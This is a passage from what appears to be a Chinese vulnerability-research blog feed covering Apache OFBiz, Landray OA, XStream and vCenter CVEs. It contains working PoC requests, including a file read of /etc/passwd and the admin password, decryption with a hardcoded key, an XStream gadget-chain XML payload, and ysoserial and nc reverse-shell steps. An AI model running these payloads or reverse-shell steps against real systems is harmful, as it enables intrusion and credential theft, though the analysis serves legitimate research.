<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/SOAPService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>python-requests/2.24.0</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>877</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ser=&quot;http://ofbiz.apache.org/service/&quot;&gt;  </span><br><span class="line">  &lt;soapenv:Header/&gt;  </span><br><span class="line">  &lt;soapenv:Body&gt;</span><br><span class="line">    &lt;ser&gt;</span><br><span class="line">      &lt;map-Map&gt;</span><br><span class="line">        &lt;map-Entry&gt;</span><br><span class="line">          &lt;map-Key&gt;</span><br><span class="line">            &lt;cus-obj&gt;ACED0005... ...0000000078&lt;/cus-obj&gt;</span><br><span class="line">          &lt;/map-Key&gt;  </span><br><span class="line">          &lt;map-Value&gt;  </span><br><span class="line">            &lt;std-String/&gt;</span><br><span class="line">          &lt;/map-Value&gt;</span><br><span class="line">        &lt;/map-Entry&gt;</span><br><span class="line">      &lt;/map-Map&gt;</span><br><span class="line">    &lt;/ser&gt;</span><br><span class="line">  &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-12/1620784767462.png"></p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p><a href="https://github.com/r0ckysec/CVE-2021-29200">https://github.com/r0ckysec/CVE-2021-29200</a></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 cve-<span class="number">2021</span>-<span class="number">29200</span>_exp.py &lt;target&gt; &lt;vps_ip&gt; &lt;vps_port&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-11/1620729375025.png"></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>漏洞EXP</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>某凌OA任意文件读取到RCE漏洞分析</title>
    <url>/2021/05/07/analysis_20210507/</url>
    <content><![CDATA[<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>某OA任意文件读取到RCE漏洞，无需授权的任意文件读取，导致管理员密码泄露，从而造成后台RCE。</p>
<span id="more"></span>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="custom-jsp-未做限制造成的任意文件读取漏洞"><a href="#custom-jsp-未做限制造成的任意文件读取漏洞" class="headerlink" title="custom.jsp 未做限制造成的任意文件读取漏洞"></a>custom.jsp 未做限制造成的任意文件读取漏洞</h4><p>漏洞存在与 <code>sys/ui/extend/varkind/custom.jsp</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620371221232.png"></p>
<p>一个简单的文件读取漏洞</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">&lt;c:<span class="keyword">import</span>&gt;标签提供了所有&lt;jsp:include&gt;行为标签所具有的功能，同时也允许包含绝对URL。</span><br><span class="line">举例来说，使用&lt;c:<span class="keyword">import</span>&gt;标签可以包含一个FTP服务器中不同的网页内容。</span><br></pre></td></tr></table></figure>

<h5 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a><strong>构造payload</strong></h5><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">var</span>=&#123;<span class="string">&quot;body&quot;</span>:&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;需要读取的本地文件&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>发送恶意payload，就能读取到本地文件。</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a><strong>poc</strong></h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sys/ui/extend/varkind/custom.jsp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"></span><br><span class="line">var=&#123;&quot;body&quot;:&#123;&quot;file&quot;:&quot;/login.jsp&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620374295107.png"></p>
<p>也可以利用file协议读取 <code>passwd</code></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">var</span>=&#123;<span class="string">&quot;body&quot;</span>:&#123;<span class="string">&quot;file&quot;</span>:<span class="string">&quot;file:///etc/passwd&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620374476393.png"></p>
<h4 id="后台RCE漏洞"><a href="#后台RCE漏洞" class="headerlink" title="后台RCE漏洞"></a>后台RCE漏洞</h4><p>蓝凌OA本身存在管理系统配置的路径为 <code>admin.do</code> , 而且密码以硬编码形式存在与本地配置文件中</p>
<p><code>WEB-INF/KmssConfig/admin.properties</code></p>
<p>结合上面的本地文件读取漏洞来获取到加密的<code>password</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620397123977.png"></p>
<p>继续分析解密方式</p>
<p>在 <code>com.landray.kmss.sys.config.action.SysConfigAdminAction#config</code> 中用了密码校验逻辑</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620375191110.png"></p>
<p>跟进 <code>validatePassWord</code> 方法</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620375260892.png"></p>
<p>在 <code>com.landray.kmss.sys.config.action.SysConfigAdminUtil#getAdminProperties</code> 方法中加载了某个配置文件</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620375344977.png"></p>
<p><code>ADMIN_PROPERTIES_PATH</code> 所指向的文件就是密码硬编码存在的配置文件路径</p>
<p>所以可以利用这个方法来对密码进行解密 <code>doPasswordDecrypt</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620375940361.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">doPasswordDecrypt</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        DESEncrypt des = <span class="keyword">new</span> DESEncrypt(<span class="string">&quot;kmssAdminKey&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> des.decryptString(password);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var4) &#123;</span><br><span class="line">        logger.debug(var4);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DESEncrypt des0 = <span class="keyword">new</span> DESEncrypt(<span class="string">&quot;kmssAdminKey&quot;</span>, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">return</span> des0.decryptString(password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;admin.do 密码解密失败！&quot;</span>, var4);</span><br><span class="line">            logger.error(var3);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;admin.do 密码解密失败！&quot;</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看解密方法，获取密钥：<code>kmssAdminKey</code></p>
<p>利用在线工具解密获得明文密码 <a href="http://tool.chacuo.net/cryptdes">http://tool.chacuo.net/cryptdes</a></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620397032703.png"></p>
<p>获取到密码后，直接登录 <code>admin.do</code> 进入管理配置系统</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620399819876.png"></p>
<p>最后利用 JNDI JDBC进行反序列化RCE</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620397870452.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-07/1620398140370.png"></p>
<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ">https://mp.weixin.qq.com/s/fNovp4mbKIMkVdF2ywcQcQ</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>Java</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-29505） XStream远程代码执行漏洞分析</title>
    <url>/2021/05/25/analysis_20210525/</url>
    <content><![CDATA[<h4 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h4><p>XStream &lt;= 1.4.16</p>
<span id="more"></span>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用 <code>sun.rmi.registry.RegistryImpl_Stub</code> 类绕过，导致远程代码执行。</p>
<p>建议更新至1.4.17以上版本</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>环境搭建</p>
<p>idea + maven </p>
<p>pom.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.16<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>xmlpull<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xmlpull<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<p><code>yso</code> 启动 RMI 监听</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial<span class="selector-class">.jar</span> ysoserial<span class="selector-class">.exploit</span><span class="selector-class">.JRMPListener</span> <span class="number">1098</span> CommonsBeanutils1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>



<p>创建xstream</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        XStream xstream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xstream.fromXML(<span class="keyword">new</span> File(<span class="string">&quot;E:\\...\\XStream\\CVE-2021-29505\\exp.xml&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621928655695.png"></p>
<p>运行即可触发任意命令执行</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621932126089.png"></p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>直接从 <code>fromXML</code> 进入 <code>XStream</code></p>
<p><code>com.thoughtworks.xstream.XStream#fromXML(java.io.File, java.lang.Object)</code></p>
<p>通过 <code>createReader()</code> 加载XML到 <code>HierarchicalStreamReader</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621929097627.png"></p>
<p>继续跟进 <code>com.thoughtworks.xstream.XStream#unmarshal(com.thoughtworks.xstream.io.HierarchicalStreamReader, java.lang.Object)</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621928895564.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621928970105.png"></p>
<p>在这里调用了 <code>this.marshallingStrategy.unmarshal</code></p>
<p>跟进后在 <code>com/thoughtworks/xstream/core/AbstractTreeMarshallingStrategy.class:20</code>  创建了 <code>TreeUnmarshaller</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621929541355.png"></p>
<p>继续跟进 <code>start</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621929664118.png"></p>
<p>进入 <code>com.thoughtworks.xstream.core.TreeUnmarshaller#convertAnother(java.lang.Object, java.lang.Class, com.thoughtworks.xstream.converters.Converter)</code> 开始将xml的恶意流进行 <code>lookup</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621929833558.png"></p>
<p>此时已加载到 <code>java.util.PriorityQueue</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621930011869.png"></p>
<p>通过调用链，可以看出进行了类反射调用，这样恶意构造的类就会被恶意执行。</p>
<p>回到 <code>com.thoughtworks.xstream.XStream#setupSecurity</code> 设置黑名单方法中</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621931959878.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621932395350.png"></p>
<p>发现没有对 <code>rmi</code> 进行限制所以可以导致 <code>sun.rmi.registry.RegistryImpl_Stub</code> 的恶意加载。</p>
<p>继续跟进 <code>com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter#doUnmarshal</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621933671949.png"></p>
<p>通过反射调用 <code>RegistryImpl_Stub</code> 接口实现 <code>java.rmi.server.RemoteObject</code> 类</p>
<p>最后在 <code>com/thoughtworks/xstream/converters/reflection/SerializableConverter.class:394</code> 的 <code>callReadObject</code> 中实现 <code>rmi</code> 的远程cc链的触发 </p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621933879530.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-05-25/1621934192874.png"></p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>12345<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">parsedMessage</span>&gt;</span>true<span class="tag">&lt;/<span class="name">parsedMessage</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">soapVersion</span>&gt;</span>SOAP_11<span class="tag">&lt;/<span class="name">soapVersion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bodyParts</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">sm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">attachmentsInitialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">attachmentsInitialized</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nullIter</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">aliases</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">candidates</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">names</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>aa<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">environment</span>/&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">registry</span> <span class="attr">class</span>=<span class="string">&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>UnicastRef<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1098<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">long</span>&gt;</span>0<span class="tag">&lt;/<span class="name">long</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">short</span>&gt;</span>0<span class="tag">&lt;/<span class="name">short</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">java.rmi.server.RemoteObject</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">registry</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">host</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">host</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">port</span>&gt;</span>1098<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">ctx</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">candidates</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">aliases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nullIter</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">sm</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://www.anquanke.com/post/id/237207">https://www.anquanke.com/post/id/237207</a></p>
<p><a href="https://security.tencent.com/index.php/announcement/msg/242">https://security.tencent.com/index.php/announcement/msg/242</a></p>
<p><a href="https://x-stream.github.io/CVE-2021-29505.html">https://x-stream.github.io/CVE-2021-29505.html</a></p>
<p><a href="https://paper.seebug.org/1543/">https://paper.seebug.org/1543/</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>漏洞POC</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-26295）Apache OFBiz 远程代码执行漏洞EXP</title>
    <url>/2021/03/24/cve-2021-26295_exp/</url>
    <content><![CDATA[<p><strong>CVE-2021-26295 EXP 可成功反弹Shell</strong></p>
<blockquote>
<p><strong>本文以及工具仅限技术分享，严禁用于非法用途，否则产生的一切后果自行承担。</strong></p>
</blockquote>
<h3 id="触发命令执行EXP"><a href="#触发命令执行EXP" class="headerlink" title="触发命令执行EXP"></a>触发命令执行EXP</h3><span id="more"></span>

<h4 id="1-VPS启动RMI监听-9999-端口"><a href="#1-VPS启动RMI监听-9999-端口" class="headerlink" title="1. VPS启动RMI监听 9999 端口"></a>1. VPS启动<code>RMI</code>监听 <code>9999</code> 端口</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsBeanutils1 &#x27;[要执行的命令]&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="2-VPS启动nc监听-64444-端口"><a href="#2-VPS启动nc监听-64444-端口" class="headerlink" title="2. VPS启动nc监听 64444 端口"></a>2. VPS启动<code>nc</code>监听 <code>64444</code> 端口</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 64444</span><br></pre></td></tr></table></figure>

<h4 id="3-执行python脚本"><a href="#3-执行python脚本" class="headerlink" title="3. 执行python脚本"></a>3. 执行python脚本</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 cve-2021-26295_exp.py &lt;target&gt; &lt;vps_ip&gt; &lt;vps_port&gt;</span><br></pre></td></tr></table></figure>



<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-24/1616580076993.png"></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-03-24/1616580247015.png"></p>
<h4 id="EXP获取"><a href="#EXP获取" class="headerlink" title="EXP获取"></a>EXP获取</h4><p><a href="https://github.com/r0ckysec/CVE-2021-26295" target="_blank">https://github.com/r0ckysec/CVE-2021-26295</a></p>
]]></content>
      <categories>
        <category>EXP|POC</category>
      </categories>
      <tags>
        <tag>漏洞EXP</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>（CVE-2021-21985） VMware vCenter Server 远程代码执行漏洞分析</title>
    <url>/2021/06/07/analysis_20210607/</url>
    <content><![CDATA[<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>这个漏洞披露也有一段时间了</p>
<p>根据老外对补丁的分析文章 <a href="https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis">https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985#rapid7-analysis</a></p>
<span id="more"></span>

<p>初步的对漏洞有些了解</p>
<p>通过补丁对比，只要对两个地方进行了修复</p>
<p><code>h5-vsan-context.jar!/WEB-INF/web.xml</code></p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622795385697.png"></p>
<p>删除了对 <code>/rest/*</code> 的路由映射，没有开放路由访问会返回401，表示已经修复</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622795438295.png"></p>
<p>在 <code>com.vmware.vsan.client.services.ProxygenController</code> 类中添加了对 <code>method</code> 的判断</p>
<p><img src="https://gitee.com/r0cky/BlogImages/raw/master/images/2021-06-05/1622795889994.png"></p>
